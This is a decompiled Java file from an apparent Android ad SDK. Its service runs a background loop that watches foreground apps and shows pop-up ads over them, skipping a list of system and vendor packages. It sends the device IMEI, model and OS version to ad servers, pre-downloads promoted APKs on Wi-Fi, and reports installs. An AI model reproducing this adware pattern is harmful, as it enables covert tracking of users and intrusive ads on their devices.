// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
package com.bbads.android.mixsdk;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import com.bbads.android.CS;
import android.app.ActivityManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;

// Referenced classes of package com.android.mixsdk.insert:
//            DownloadService, InsertUI
public class InsertService extends Service {
    public static void apkInstalled(String s) {
        Message message = Message.obtain();
        message.what = 2;
        message.obj = s;
        handler.sendMessage(message);
    }
    public static boolean checkwifi() {
        ConnectivityManager connectivitymanager = (ConnectivityManager) context.getApplicationContext().getSystemService("connectivity");
        if (connectivitymanager != null) {
            //L1_L1:
            NetworkInfo anetworkinfo[] = connectivitymanager.getAllNetworkInfo();
            if (anetworkinfo != null) {
                int i = 0;
                while (i < anetworkinfo.length) {
                    if (anetworkinfo[i].getTypeName().equals("WIFI") && anetworkinfo[i].isConnected()) return true;
                    i++;
                }
            }
        }
        return false;
    }
    public static void downfirst(ArrayList arraylist) {
        imgs = arraylist;
        showimgs = new ArrayList();
        int i = 0;
        do {
            int j;
            for (j = 0; i >= arraylist.size() || j == 2;)
                return;
            String s = ((ImageInfo) arraylist.get(i)).getPackageName();
            if (!Tools.apkExits(context, s)) {
                if (j == 0) showimgs.add(arraylist.get(i));
                else showimgs.add(arraylist.get(i));
                if (checkwifi() && showimgs.size() != 0) DownloadService.setImages2(arraylist, i, 2, "");
                j++;
            }
            i++;
        } while (true);
    }
    public static void getBms(ArrayList arraylist, int i) {
        Message message = Message.obtain();
        message.what = 4;
        message.obj = arraylist;
        handler.sendMessage(message);
    }
    public static void getImgs(ArrayList arraylist, int i) {
        Message message = Message.obtain();
        message.what = 3;
        message.obj = arraylist;
        handler.sendMessage(message);
    }
    private static final int INSERT_APKINSTALLED = 2;
    private static final int INSERT_GETBMS = 4;
    private static final int INSERT_GETIMGS = 3;
    private static final int INSERT_OPENUNINSTALLFILE = 5;
    private static final int INSERT_SHOWALERTDIALOG = 1;
    private static final int SHOW_POP = 6;
    private static Context context;
    private static Handler handler;
    private static ArrayList imgs;
    private static ArrayList showimgs;
    private Thread actThread;
    private InsertUI alertDialog;
    private String appid;
    private ArrayList imgs_show5;
    private int insertShowIndexMax;
    private String lastpackageName;
    private SharedPreferences sp;
    public InsertService() {}
    protected void ApkInstalled(String s) {
        String s1;
        int k;
        int i1;
        s1 = Tools.getIMEI(context);
        SharedPreferences sharedpreferences = CS.context.getSharedPreferences("CheckInit", 0);
        int i = sharedpreferences.getInt("installMonth", 1 + new Date().getMonth());
        int j = sharedpreferences.getInt("installDay", new Date().getDate());
        int l;
        if (1 + new Date().getMonth() > i) k = new Date().getDate() + Calendar.getInstance().getActualMaximum(5) - j;
        else k = new Date().getDate() - j;
        if (imgs_show5 != null) {
            //L1_L1:
            l = imgs_show5.size();
            i1 = 0;
            if (l != 0) {
                //L3_L3:
                while (i1 < imgs_show5.size()) {
                    if (s.equals(((ImageInfo) imgs_show5.get(i1)).getPackageName())) {
                        int j1 = Integer.parseInt(((ImageInfo) imgs_show5.get(i1)).getId());
                        Tools.sendDataToService(new StringBuilder(CS.apkInstalled+"uuid=").append(s1).append("&app_id=").append(appid).append("&ad_id=")
                                .append(j1).append("&survivaltime=").append(k).toString());
                        startActivity(getPackageManager().getLaunchIntentForPackage(s));
                        return;
                    }
                    i1++;
                }
            }
        }
    }
    protected void checksysact(int i) {
        ActivityManager activitymanager = (ActivityManager) context.getSystemService("activity");
        List list = activitymanager.getRunningTasks(1000);
        ComponentName componentname = activitymanager.getRunningTasks(1).get(0).topActivity;
        if (list.size() > i && !checkSysAct(componentname.getPackageName())) {
            list.size();
            int j = context.getSharedPreferences("insertShow", 0).getInt("frequency", 0);
            long l = sp.getLong("preTime", 0L);
            long l1 = (System.currentTimeMillis() - l) / 60000L;
            int k = sp.getInt("times", 0);
            if (Math.abs(l1) > j || k == 0) handler.sendEmptyMessage(1);
            list.size();
            return;
        } else {
            list.size();
            return;
        }
    }
    protected boolean checkSysAct(String s) {
        String s1 = "";
        ArrayList arraylist;
        int i;
        try {
            s1 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).packageName;
        } catch (android.content.pm.PackageManager.NameNotFoundException namenotfoundexception) {
            namenotfoundexception.printStackTrace();
        }
        arraylist = new ArrayList();
        arraylist.add("com.example.servicedemo");
        arraylist.add("com.sec.");
        arraylist.add("com.wandoujia.");
        arraylist.add("com.samsung.");
        arraylist.add("com.htc.launcher");
        arraylist.add("com.android.packageinstaller");
        arraylist.add("com.qihoo");
        arraylist.add("com.legame.sybbvideo1");
        arraylist.add(s1);
        i = 0;
        do {
            if (i >= arraylist.size()) {
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1000L);
                            return;
                        } catch (InterruptedException interruptedexception) {
                            interruptedexception.printStackTrace();
                        }
                    }
                }.start();
                if (lastpackageName == null || !lastpackageName.equals(s)) {
                    lastpackageName = s;
                    return false;
                }
                break;
            }
            if (s.contains((String) arraylist.get(i)) || s.equals("android")) {
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Thread.sleep(1000L);
                            return;
                        } catch (InterruptedException interruptedexception) {
                            interruptedexception.printStackTrace();
                        }
                    }
                }.start();
                return true;
            }
            i++;
        } while (true);
        if (!lastpackageName.equals(s)) {
            lastpackageName = s;
            return false;
        } else {
            return true;
        }
    }
    private void createHandler() {
        handler = new Handler() {
            @Override
            public void handleMessage(Message message) {
                switch (message.what) {
                    case 5: // '\005'
                    default:
                        return;
                    case 1: // '\001'
                        showAlertDialog();
                        return;
                    case 2: // '\002'
                        ApkInstalled((String) message.obj);
                        return;
                    case 3: // '\003'
                        InsertImgUtil.DownLoadBms((ArrayList) message.obj, 2);
                        return;
                    case 4: // '\004'
                        try {
                            alertDialog.showImages((ArrayList) message.obj, insertShowIndexMax);
                            return;
                        } catch (Exception exception) {
                            exception.printStackTrace();
                        }
                        return;
                    case 6: // '\006'
                        new PopUI(InsertService.context).initView();
                        return;
                }
            }
        };
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    protected void showAlertDialog() {
        if (imgs == null) {
            String s3 = Tools.getIMEI(context);
            String s4 = context.getSharedPreferences("insertShow", 0).getString("appid", "");
            int j = Tools.getSurvivalDay();
            String s5 = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
            InsertImgUtil.getImgs(new StringBuilder(CS.getadlist+"app_id=").append(s4).append("&uuid=").append(s3).append("&data_type=ad&ad_type=")
                    .append(2).append("&model=").append(s5).append("&survivaltime=").append(j).append("&apiVersion=").append(android.os.Build.VERSION.RELEASE).append("&version=")
                    .append("1.0.23").toString(), 3);
        } else {
            downfirst(imgs);
            alertDialog = new InsertUI(context.getApplicationContext());
            String s = Tools.getIMEI(context);
            SharedPreferences sharedpreferences = context.getSharedPreferences("insertShow", 0);
            String s1 = sharedpreferences.getString("appid", "");
            int i = Tools.getSurvivalDay();
            String s2 = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
            new StringBuilder(CS.getadlist+"app_id=").append(s1).append("&uuid=").append(s).append("&data_type=ad&ad_type=").append(2).append("&model=")
                    .append(s2).append("&survivaltime=").append(i).append("&apiVersion=").append(android.os.Build.VERSION.RELEASE).append("&version=").append("1.0.23").toString();
            if (sharedpreferences.getString("status", "").equals("1") && Tools.checkStrNull(s1) && showimgs != null) {
                getImgs(showimgs, 2);
                return;
            }
        }
    }
    public void start(Context context1) {
        createHandler();
        String s;
        SharedPreferences sharedpreferences;
        String s1;
        int i;
        String s2;
        String s3;
        if (CS.context != null) {
            context = CS.context;
        } else {
            context = context1;
            CS.context = context1;
        }
        sp = context.getSharedPreferences("insertShow", 0);
        appid = sp.getString("appid", "");
        new DownloadService().onCreate();
        s = Tools.getIMEI(context);
        sharedpreferences = context.getSharedPreferences("insertShow", 0);
        s1 = sharedpreferences.getString("appid", "");
        i = Tools.getSurvivalDay();
        s2 = new StringBuilder(String.valueOf(Build.MODEL)).toString().toString().replace(" ", "");
        s3 = new StringBuilder(CS.getadlist+"app_id=").append(s1).append("&uuid=").append(s).append("&data_type=ad&ad_type=").append(2).append("&model=")
                .append(s2).append("&survivaltime=").append(i).append("&apiVersion=").append(android.os.Build.VERSION.RELEASE).append("&version=").append("1.0.23").toString();
        if (sharedpreferences.getString("status", "").equals("1") && Tools.checkStrNull(s1)) InsertImgUtil.getImgs(s3, 3);
        actThread = new Thread() {
            @Override
            public void run() {
                int j = 0;
                //_L3:
                while (true) {
                    List list;
                    ComponentName componentname;
                    ActivityManager activitymanager = (ActivityManager) InsertService.context.getSystemService("activity");
                    list = activitymanager.getRunningTasks(1000);
                    componentname = activitymanager.getRunningTasks(1).get(0).topActivity;
                    if (!(list.size() <= j || checkSysAct(componentname.getPackageName()))) {
                        //l1_L1:
                        int l;
                        int i1;
                        long l1;
                        j = list.size();
                        SharedPreferences sharedpreferences1 = InsertService.context.getSharedPreferences("insertShow", 0);
                        l = sharedpreferences1.getInt("frequency", 0);
                        i1 = sp.getInt("times", 0);
                        l1 = sharedpreferences1.getLong("preTime", 0L);
                        if (!(Math.abs(System.currentTimeMillis() - l1) / 1000L <= 2 + l * 60 && i1 != 0)) {
                            android.content.SharedPreferences.Editor editor = sp.edit();
                            editor.putInt("times", i1 + 1);
                            editor.putLong("preTime", System.currentTimeMillis());
                            editor.commit();
                            InsertService.handler.sendEmptyMessage(1);
                            j = list.size();
                        } else {
                            j = list.size();
                        }
                    } else {
                        j = list.size();
                    }
                    //_L4:
                    try {
                        Thread.sleep(1000L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        };
        actThread.start();
        handler.sendEmptyMessageDelayed(5, 5000L);
    }
}
